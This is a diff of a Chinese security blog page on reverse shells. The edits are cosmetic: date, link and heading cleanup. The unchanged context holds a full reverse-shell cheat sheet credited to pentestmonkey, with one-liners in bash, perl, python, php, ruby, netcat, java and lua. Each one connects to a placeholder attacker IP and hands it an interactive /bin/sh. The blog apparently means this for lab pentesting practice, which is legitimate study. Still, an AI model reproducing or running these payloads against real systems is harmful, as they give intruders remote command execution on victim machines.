@@ -384,7 +384,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-24
+                    2021-07-26
                 </div>
                 
 
@@ -418,11 +418,10 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
+                <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
 <p>攻击者：kali2020.03 64位 192.168.229.129</p>
 <p>靶机：kali2018 192.168.229.130</p>
-<p>[</p>
-<p>](<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a>)</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a></p>
 <h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>开启监听端口</p>
@@ -458,7 +457,9 @@
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
 <h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
+
+
+<h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
 <p>攻击者：kali2020.03 64位 192.168.229.129</p>
 <p>靶机：win7 x64 192.168.229.134</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
@@ -864,7 +865,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">23k</span>&nbsp;字
+                class="white-color">23.2k</span>&nbsp;字
             
             
             
